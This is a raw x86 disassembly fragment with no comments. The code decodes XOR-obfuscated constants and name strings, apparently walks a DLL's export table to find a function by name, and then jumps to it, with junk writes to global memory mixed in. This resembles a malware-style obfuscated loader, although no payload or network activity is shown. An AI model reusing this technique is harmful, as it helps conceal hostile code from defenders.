  421453:	jmp    0x421465
  421458:	mov    eax,DWORD PTR [ebp-0x144]
  42145e:	inc    eax
  42145f:	mov    DWORD PTR [ebp-0x144],eax
  421465:	mov    eax,DWORD PTR [ebp-0xe8]
  42146b:	mov    ecx,DWORD PTR [ebp-0x144]
  421471:	cmp    ecx,DWORD PTR [eax+0x18]
  421474:	je     0x421a2d
  42147a:	mov    eax,DWORD PTR [ebp-0x144]
  421480:	mov    ecx,DWORD PTR [ebp-0x38]
  421483:	mov    edx,DWORD PTR [ebp+0x8]
  421486:	add    edx,DWORD PTR [ecx+eax*4]
  421489:	mov    DWORD PTR [ebp-0x48],edx
  42148c:	mov    eax,DWORD PTR [ebp-0x48]
  42148f:	mov    DWORD PTR [ebp-0x210],eax
  421495:	mov    eax,DWORD PTR [ebp+0xc]
  421498:	mov    DWORD PTR [ebp-0x20c],eax
  42149e:	mov    DWORD PTR [ebp-0x1f0],0xba699573
  4214a8:	mov    DWORD PTR [ebp-0x1ec],0x9c0a89d8
  4214b2:	mov    DWORD PTR [ebp-0x1e0],0xba699577
  4214bc:	mov    DWORD PTR [ebp-0x1dc],0x9c0a89d8
  4214c6:	lea    eax,[ebp-0x1e8]
  4214cc:	mov    DWORD PTR [ebp-0x1f4],eax
  4214d2:	mov    eax,DWORD PTR [ebp-0x20c]
  4214d8:	movzx  eax,WORD PTR [eax+0x20]
  4214dc:	xor    eax,0xa38b
  4214e1:	movzx  eax,ax
  4214e4:	sar    eax,1
  4214e6:	mov    ecx,DWORD PTR [ebp-0x20c]
  4214ec:	movzx  ecx,WORD PTR [ecx+0x20]
  4214f0:	xor    ecx,0xa38b
  4214f6:	movzx  ecx,cx
  4214f9:	shl    ecx,0xf
  4214fc:	or     eax,ecx
  4214fe:	movzx  eax,ax
  421501:	mov    ecx,DWORD PTR [ebp-0x1f4]
  421507:	mov    DWORD PTR [ecx],eax
  421509:	mov    eax,DWORD PTR [ebp-0x1e0]
  42150f:	mov    edx,DWORD PTR [ebp-0x1dc]
  421515:	xor    eax,0xba699573
  42151a:	xor    edx,0x9c0a89d8
  421520:	mov    cl,0x2
  421522:	call   0x41a184
  421527:	mov    ebx,eax
  421529:	mov    esi,edx
  42152b:	mov    eax,DWORD PTR [ebp-0x1e0]
  421531:	mov    edx,DWORD PTR [ebp-0x1dc]
  421537:	xor    eax,0xba699573
  42153c:	xor    edx,0x9c0a89d8
  421542:	mov    cl,0x3e
  421544:	call   0x421c3d
  421549:	or     ebx,eax
  42154b:	or     esi,edx
  42154d:	movzx  eax,bl
  421550:	push   eax
  421551:	lea    eax,[ebp-0x198]
  421557:	push   eax
  421558:	call   0x41e084
  42155d:	mov    eax,DWORD PTR [ebp-0x1f0]
  421563:	mov    edx,DWORD PTR [ebp-0x1ec]
  421569:	xor    eax,0xba699573
  42156e:	xor    edx,0x9c0a89d8
  421574:	mov    cl,0x2
  421576:	call   0x41a184
  42157b:	mov    esi,eax
  42157d:	mov    edi,edx
  42157f:	mov    eax,DWORD PTR [ebp-0x1f0]
  421585:	mov    edx,DWORD PTR [ebp-0x1ec]
  42158b:	xor    eax,0xba699573
  421590:	xor    edx,0x9c0a89d8
  421596:	mov    cl,0x3e
  421598:	call   0x421c3d
  42159d:	or     esi,eax
  42159f:	or     edi,edx
  4215a1:	mov    DWORD PTR [ebp-0x1f8],esi
  4215a7:	jmp    0x4215fc
  4215ac:	mov    eax,DWORD PTR [ebp-0x1e0]
  4215b2:	mov    edx,DWORD PTR [ebp-0x1dc]
  4215b8:	xor    eax,0xba699573
  4215bd:	xor    edx,0x9c0a89d8
  4215c3:	mov    cl,0x2
  4215c5:	call   0x41a184
  4215ca:	mov    esi,eax
  4215cc:	mov    edi,edx
  4215ce:	mov    eax,DWORD PTR [ebp-0x1e0]
  4215d4:	mov    edx,DWORD PTR [ebp-0x1dc]
  4215da:	xor    eax,0xba699573
  4215df:	xor    edx,0x9c0a89d8
  4215e5:	mov    cl,0x3e
  4215e7:	call   0x421c3d
  4215ec:	or     esi,eax
  4215ee:	or     edi,edx
  4215f0:	add    esi,DWORD PTR [ebp-0x1f8]
  4215f6:	mov    DWORD PTR [ebp-0x1f8],esi
  4215fc:	mov    eax,DWORD PTR [ebp-0x1e8]
  421602:	cmp    DWORD PTR [ebp-0x1f8],eax
  421608:	je     0x42169b
  42160e:	mov    eax,DWORD PTR [ebp-0x1f8]
  421614:	mov    ecx,DWORD PTR [ebp-0x20c]
  42161a:	movzx  eax,WORD PTR [ecx+eax*4+0x2]
  42161f:	xor    eax,0xa38b
  421624:	movzx  eax,ax
  421627:	sar    eax,1
  421629:	mov    ecx,DWORD PTR [ebp-0x1f8]
  42162f:	mov    edx,DWORD PTR [ebp-0x20c]
  421635:	movzx  ecx,WORD PTR [edx+ecx*4+0x2]
  42163a:	xor    ecx,0xa38b
  421640:	movzx  ecx,cx
  421643:	shl    ecx,0xf
  421646:	or     eax,ecx
  421648:	movzx  eax,ax
  42164b:	mov    DWORD PTR [ebp-0x1fc],eax
  421651:	mov    eax,DWORD PTR [ebp-0x1f8]
  421657:	mov    ecx,DWORD PTR [ebp-0x20c]
  42165d:	movzx  eax,WORD PTR [ecx+eax*4]
  421661:	xor    eax,0xa38b
  421666:	movzx  eax,ax
  421669:	sar    eax,1
  42166b:	mov    ecx,DWORD PTR [ebp-0x1f8]
  421671:	mov    edx,DWORD PTR [ebp-0x20c]
  421677:	movzx  ecx,WORD PTR [edx+ecx*4]
  42167b:	xor    ecx,0xa38b
  421681:	movzx  ecx,cx
  421684:	shl    ecx,0xf
  421687:	or     eax,ecx
  421689:	mov    ecx,DWORD PTR [ebp-0x1fc]
  42168f:	mov    BYTE PTR [ebp+ecx*1-0x198],al
  421696:	jmp    0x4215ac
  42169b:	mov    eax,DWORD PTR [ebp-0x1f0]
  4216a1:	mov    edx,DWORD PTR [ebp-0x1ec]
  4216a7:	xor    eax,0xba699573
  4216ac:	xor    edx,0x9c0a89d8
  4216b2:	mov    cl,0x2
  4216b4:	call   0x41a184
  4216b9:	mov    esi,eax
  4216bb:	mov    edi,edx
  4216bd:	mov    eax,DWORD PTR [ebp-0x1f0]
  4216c3:	mov    edx,DWORD PTR [ebp-0x1ec]
  4216c9:	xor    eax,0xba699573
  4216ce:	xor    edx,0x9c0a89d8
  4216d4:	mov    cl,0x3e
  4216d6:	call   0x421c3d
  4216db:	or     esi,eax
  4216dd:	or     edi,edx
  4216df:	mov    DWORD PTR [ebp-0x1e4],esi
  4216e5:	mov    eax,DWORD PTR [ebp-0x1e0]
  4216eb:	mov    edx,DWORD PTR [ebp-0x1dc]
  4216f1:	xor    eax,0xba699573
  4216f6:	xor    edx,0x9c0a89d8
  4216fc:	mov    cl,0x2
  4216fe:	call   0x41a184
  421703:	mov    esi,eax
  421705:	mov    edi,edx
  421707:	mov    eax,DWORD PTR [ebp-0x1e0]
  42170d:	mov    edx,DWORD PTR [ebp-0x1dc]
  421713:	xor    eax,0xba699573
  421718:	xor    edx,0x9c0a89d8
  42171e:	mov    cl,0x3e
  421720:	call   0x421c3d
  421725:	or     esi,eax
  421727:	or     edi,edx
  421729:	mov    DWORD PTR [ebp-0x23c],esi
  42172f:	mov    DWORD PTR [ebp-0x238],edi
  421735:	mov    eax,DWORD PTR [ebp-0x23c]
  42173b:	or     eax,DWORD PTR [ebp-0x238]
  421741:	je     0x4219a1
  421747:	lea    eax,[ebp-0x204]
  42174d:	mov    DWORD PTR [ebp-0x208],eax
  421753:	mov    eax,DWORD PTR [ebp-0x1e4]
  421759:	xor    edx,edx
  42175b:	mov    cl,0x2
  42175d:	call   0x421c3d
  421762:	mov    esi,eax
  421764:	mov    edi,edx
  421766:	mov    eax,DWORD PTR [ebp-0x1e4]
  42176c:	xor    edx,edx
  42176e:	mov    cl,0x3e
  421770:	call   0x41a184
  421775:	or     esi,eax
  421777:	or     edi,edx
  421779:	xor    esi,0xba699573
  42177f:	xor    edi,0x9c0a89d8
  421785:	mov    eax,DWORD PTR [ebp-0x208]
  42178b:	mov    DWORD PTR [eax],esi
  42178d:	mov    DWORD PTR [eax+0x4],edi
  421790:	mov    eax,DWORD PTR [ebp-0x1e4]
  421796:	movsx  esi,BYTE PTR [ebp+eax*1-0x198]
  42179e:	mov    eax,DWORD PTR [ebp-0x1e0]
  4217a4:	mov    edx,DWORD PTR [ebp-0x1dc]
  4217aa:	xor    eax,0xba699573
  4217af:	xor    edx,0x9c0a89d8
  4217b5:	mov    cl,0x2
  4217b7:	call   0x41a184
  4217bc:	mov    ebx,eax
  4217be:	mov    edi,edx
  4217c0:	mov    eax,DWORD PTR [ebp-0x1e0]
  4217c6:	mov    edx,DWORD PTR [ebp-0x1dc]
  4217cc:	xor    eax,0xba699573
  4217d1:	xor    edx,0x9c0a89d8
  4217d7:	mov    cl,0x3e
  4217d9:	call   0x421c3d
  4217de:	or     ebx,eax
  4217e0:	or     edi,edx
  4217e2:	movsx  eax,bl
  4217e5:	cmp    esi,eax
  4217e7:	je     0x421947
  4217ed:	mov    eax,DWORD PTR [ebp-0x1e4]
  4217f3:	movsx  esi,BYTE PTR [ebp+eax*1-0x198]
  4217fb:	mov    eax,DWORD PTR [ebp-0x204]
  421801:	mov    edx,DWORD PTR [ebp-0x200]
  421807:	xor    eax,0xba699573
  42180c:	xor    edx,0x9c0a89d8
  421812:	mov    cl,0x2
  421814:	call   0x41a184
  421819:	mov    edi,eax
  42181b:	mov    ebx,edx
  42181d:	mov    eax,DWORD PTR [ebp-0x204]
  421823:	mov    edx,DWORD PTR [ebp-0x200]
  421829:	xor    eax,0xba699573
  42182e:	xor    edx,0x9c0a89d8
  421834:	mov    cl,0x3e
  421836:	call   0x421c3d
  42183b:	or     edi,eax
  42183d:	or     ebx,edx
  42183f:	mov    eax,DWORD PTR [ebp-0x210]
  421845:	movsx  eax,BYTE PTR [eax+edi*1]
  421849:	cmp    esi,eax
  42184b:	je     0x42185b
  421851:	jmp    0x4219a1
  421856:	jmp    0x421947
  42185b:	mov    eax,DWORD PTR [ebp-0x204]
  421861:	mov    edx,DWORD PTR [ebp-0x200]
  421867:	xor    eax,0xba699573
  42186c:	xor    edx,0x9c0a89d8
  421872:	mov    cl,0x2
  421874:	call   0x41a184
  421879:	mov    esi,eax
  42187b:	mov    edi,edx
  42187d:	mov    eax,DWORD PTR [ebp-0x204]
  421883:	mov    edx,DWORD PTR [ebp-0x200]
  421889:	xor    eax,0xba699573
  42188e:	xor    edx,0x9c0a89d8
  421894:	mov    cl,0x3e
  421896:	call   0x421c3d
  42189b:	or     esi,eax
  42189d:	or     edi,edx
  42189f:	mov    eax,DWORD PTR [ebp-0x210]
  4218a5:	movsx  esi,BYTE PTR [eax+esi*1]
  4218a9:	mov    eax,DWORD PTR [ebp-0x1f0]
  4218af:	mov    edx,DWORD PTR [ebp-0x1ec]
  4218b5:	xor    eax,0xba699573
  4218ba:	xor    edx,0x9c0a89d8
  4218c0:	mov    cl,0x2
  4218c2:	call   0x41a184
  4218c7:	mov    ebx,eax
  4218c9:	mov    edi,edx
  4218cb:	mov    eax,DWORD PTR [ebp-0x1f0]
  4218d1:	mov    edx,DWORD PTR [ebp-0x1ec]
  4218d7:	xor    eax,0xba699573
  4218dc:	xor    edx,0x9c0a89d8
  4218e2:	mov    cl,0x3e
  4218e4:	call   0x421c3d
  4218e9:	or     ebx,eax
  4218eb:	or     edi,edx
  4218ed:	movsx  eax,bl
  4218f0:	cmp    esi,eax
  4218f2:	jne    0x421947
  4218f8:	mov    eax,DWORD PTR [ebp-0x1e0]
  4218fe:	mov    edx,DWORD PTR [ebp-0x1dc]
  421904:	xor    eax,0xba699573
  421909:	xor    edx,0x9c0a89d8
  42190f:	mov    cl,0x2
  421911:	call   0x41a184
  421916:	mov    esi,eax
  421918:	mov    edi,edx
  42191a:	mov    eax,DWORD PTR [ebp-0x1e0]
  421920:	mov    edx,DWORD PTR [ebp-0x1dc]
  421926:	xor    eax,0xba699573
  42192b:	xor    edx,0x9c0a89d8
  421931:	mov    cl,0x3e
  421933:	call   0x421c3d
  421938:	or     esi,eax
  42193a:	or     edi,edx
  42193c:	mov    DWORD PTR [ebp-0x214],esi
  421942:	jmp    0x4219eb
  421947:	mov    eax,DWORD PTR [ebp-0x1e0]
  42194d:	mov    edx,DWORD PTR [ebp-0x1dc]
  421953:	xor    eax,0xba699573
  421958:	xor    edx,0x9c0a89d8
  42195e:	mov    cl,0x2
  421960:	call   0x41a184
  421965:	mov    esi,eax
  421967:	mov    edi,edx
  421969:	mov    eax,DWORD PTR [ebp-0x1e0]
  42196f:	mov    edx,DWORD PTR [ebp-0x1dc]
  421975:	xor    eax,0xba699573
  42197a:	xor    edx,0x9c0a89d8
  421980:	mov    cl,0x3e
  421982:	call   0x421c3d
  421987:	or     esi,eax
  421989:	or     edi,edx
  42198b:	add    esi,DWORD PTR [ebp-0x1e4]
  421991:	mov    DWORD PTR [ebp-0x1e4],esi
  421997:	jmp    0x4216e5
  42199c:	jmp    0x4216e5
  4219a1:	mov    eax,DWORD PTR [ebp-0x1f0]
  4219a7:	mov    edx,DWORD PTR [ebp-0x1ec]
  4219ad:	xor    eax,0xba699573
  4219b2:	xor    edx,0x9c0a89d8
  4219b8:	mov    cl,0x2
  4219ba:	call   0x41a184
  4219bf:	mov    esi,eax
  4219c1:	mov    edi,edx
  4219c3:	mov    eax,DWORD PTR [ebp-0x1f0]
  4219c9:	mov    edx,DWORD PTR [ebp-0x1ec]
  4219cf:	xor    eax,0xba699573
  4219d4:	xor    edx,0x9c0a89d8
  4219da:	mov    cl,0x3e
  4219dc:	call   0x421c3d
  4219e1:	or     esi,eax
  4219e3:	or     edi,edx
  4219e5:	mov    DWORD PTR [ebp-0x214],esi
  4219eb:	mov    eax,DWORD PTR [ebp-0x214]
  4219f1:	mov    DWORD PTR [ebp-0xc8],eax
  4219f7:	cmp    DWORD PTR [ebp-0xc8],0x0
  4219fe:	je     0x421a28
  421a04:	mov    eax,DWORD PTR [ebp-0x144]
  421a0a:	mov    ecx,DWORD PTR [ebp-0xac]
  421a10:	movzx  eax,WORD PTR [ecx+eax*2]
  421a14:	mov    ecx,DWORD PTR [ebp-0xa8]
  421a1a:	mov    eax,DWORD PTR [ecx+eax*4]
  421a1d:	mov    DWORD PTR [ebp-0xfc],eax
  421a23:	jmp    0x421a2d
  421a28:	jmp    0x421458
  421a2d:	cmp    DWORD PTR [ebp-0xfc],0x0
  421a34:	jne    0x421a41
  421a3a:	xor    eax,eax
  421a3c:	jmp    0x421c36
  421a41:	mov    eax,DWORD PTR [ebp+0x8]
  421a44:	add    eax,DWORD PTR [ebp-0xfc]
  421a4a:	mov    DWORD PTR [ebp-0xec],eax
  421a50:	mov    DWORD PTR [ebp-0x74],0x0
  421a57:	cmp    DWORD PTR [ebp-0xb0],0x0
  421a5e:	je     0x421ada
  421a64:	cmp    DWORD PTR [ebp-0xb0],0x0
  421a6b:	je     0x421ada
  421a71:	mov    eax,DWORD PTR [ebp-0xb0]
  421a77:	shl    eax,0x2
  421a7a:	mov    DWORD PTR [ebp-0x74],eax
  421a7d:	mov    DWORD PTR [ebp-0x14c],0x0
  421a87:	sub    esp,DWORD PTR [ebp-0x74]
  421a8a:	mov    DWORD PTR [ebp-0x14c],esp
  421a90:	mov    DWORD PTR [ebp-0x148],0x0
  421a9a:	mov    eax,DWORD PTR [ebp-0x148]
  421aa0:	cmp    eax,DWORD PTR [ebp-0xb0]
  421aa6:	je     0x421ada
  421aac:	mov    eax,DWORD PTR [ebp-0x148]
  421ab2:	mov    ecx,DWORD PTR [ebp-0x14c]
  421ab8:	mov    edx,DWORD PTR [ebp-0x148]
  421abe:	mov    esi,DWORD PTR [ebp+0x14]
  421ac1:	mov    edx,DWORD PTR [esi+edx*4+0x4]
  421ac5:	mov    DWORD PTR [ecx+eax*4],edx
  421ac8:	mov    eax,DWORD PTR [ebp-0x148]
  421ace:	inc    eax
  421acf:	mov    DWORD PTR [ebp-0x148],eax
  421ad5:	jmp    0x421a9a
  421ada:	mov    DWORD PTR [ebp-0x9c],0x0
  421ae4:	push   0x421bfd
  421ae9:	jmp    DWORD PTR [ebp-0xec]
  421aef:	mov    eax,eax
  421af1:	mov    ecx,esp
  421af3:	ret    0x4
  421af6:	sub    DWORD PTR ds:0x422972,ecx
  421afc:	push   ebx
  421afd:	mov    eax,ds:0x422a36
  421b02:	mov    eax,DWORD PTR [eax]
  421b04:	add    DWORD PTR ds:0x4228be,eax
  421b0a:	push   esi
  421b0b:	inc    eax
  421b0c:	mov    eax,DWORD PTR [esp+0x18]
  421b10:	or     eax,eax
  421b12:	mov    DWORD PTR ds:0x422976,0x30f6
  421b1c:	jne    0x421b6d
  421b22:	mov    ecx,DWORD PTR [esp+0x14]
  421b26:	xor    DWORD PTR ds:0x4228f6,0x4645
  421b30:	mov    eax,DWORD PTR [esp+0x10]
  421b34:	mov    ebx,DWORD PTR ds:0x422992
  421b3a:	add    ebx,DWORD PTR ds:0x42299e
  421b40:	mov    DWORD PTR ds:0x422992,ebx
  421b46:	xor    edx,edx
  421b48:	adc    DWORD PTR ds:0x422972,0x7727
  421b52:	div    ecx
  421b54:	mov    ebx,eax
  421b56:	mov    eax,DWORD PTR [esp+0xc]
  421b5a:	mov    DWORD PTR ds:0x4228aa,0xac4
  421b64:	div    ecx
  421b66:	mov    edx,ebx
  421b68:	jmp    0x421bf8
  421b6d:	mov    ecx,eax
  421b6f:	movzx  eax,WORD PTR ds:0x4228ca
  421b76:	or     eax,DWORD PTR ds:0x4229b2
  421b7c:	mov    ds:0x4228ca,eax
  421b81:	mov    ebx,DWORD PTR [esp+0x14]
  421b85:	adc    DWORD PTR ds:0x422922,ecx
  421b8b:	mov    edx,DWORD PTR [esp+0x10]
  421b8f:	mov    eax,DWORD PTR [esp+0xc]
  421b93:	sbb    DWORD PTR ds:0x42299a,0x1a98
  421b9d:	shr    ecx,1
  421b9f:	mov    DWORD PTR ds:0x42289e,0x38b9
  421ba9:	rcr    ebx,1
  421bab:	or     DWORD PTR ds:0x42296e,0x13a0
  421bb5:	shr    edx,1
  421bb7:	rcr    eax,1
  421bb9:	or     ecx,ecx
  421bbb:	jne    0x421b93
  421bc1:	div    ebx
  421bc3:	mov    esi,eax
  421bc5:	mul    DWORD PTR [esp+0x18]
  421bc9:	mov    ecx,eax
  421bcb:	mov    eax,DWORD PTR [esp+0x14]
  421bcf:	mul    esi
  421bd1:	add    edx,ecx
  421bd3:	jb     0x421bf3
  421bd9:	cmp    edx,DWORD PTR [esp+0x10]
  421bdd:	ja     0x421bf3
  421be3:	jb     0x421bf4
  421be9:	cmp    eax,DWORD PTR [esp+0xc]
  421bed:	jbe    0x421bf4
  421bf3:	dec    esi
  421bf4:	xor    edx,edx
  421bf6:	mov    eax,esi
  421bf8:	pop    esi
  421bf9:	pop    ebx
  421bfa:	ret    0x10
  421bfd:	sub    DWORD PTR [ebp+0x10],0x1
  421c01:	mov    DWORD PTR ds:0x4228ce,0x220d
  421c0b:	cmp    DWORD PTR [ebp+0x10],0x0
  421c0f:	je     0x421c1e
  421c15:	and    edi,DWORD PTR ds:0x4229ca
  421c1b:	add    esp,DWORD PTR [ebp-0x74]
  421c1e:	mov    edi,DWORD PTR ds:0x422896
  421c24:	mov    DWORD PTR [ebp-0x9c],eax
  421c2a:	mov    eax,DWORD PTR [ebp-0x9c]
  421c30:	mov    DWORD PTR ds:0x4228ee,edx
  421c36:	pop    edi
  421c37:	pop    esi
  421c38:	pop    ebx
  421c39:	leave  
  421c3a:	ret    0x10
  421c3d:	mov    DWORD PTR ds:0x42298e,0x1d18
  421c47:	cmp    cl,0x40
  421c4a:	jae    0x421c91
  421c50:	cmp    cl,0x20
  421c53:	mov    DWORD PTR ds:0x4228d6,0x5a1c
  421c5d:	jae    0x421c69
  421c63:	shld   edx,eax,cl
  421c66:	shl    eax,cl
  421c68:	ret    
  421c69:	and    DWORD PTR ds:0x42293e,0x7607
  421c73:	mov    edx,eax
  421c75:	sub    DWORD PTR ds:0x4228fa,0x422952
  421c7f:	xor    eax,eax
  421c81:	and    cl,0x1f
  421c84:	mov    DWORD PTR ds:0x42295e,0x73ce
  421c8e:	shl    edx,cl
  421c90:	ret    
  421c91:	xor    eax,eax
  421c93:	xor    edx,edx
  421c95:	ret    
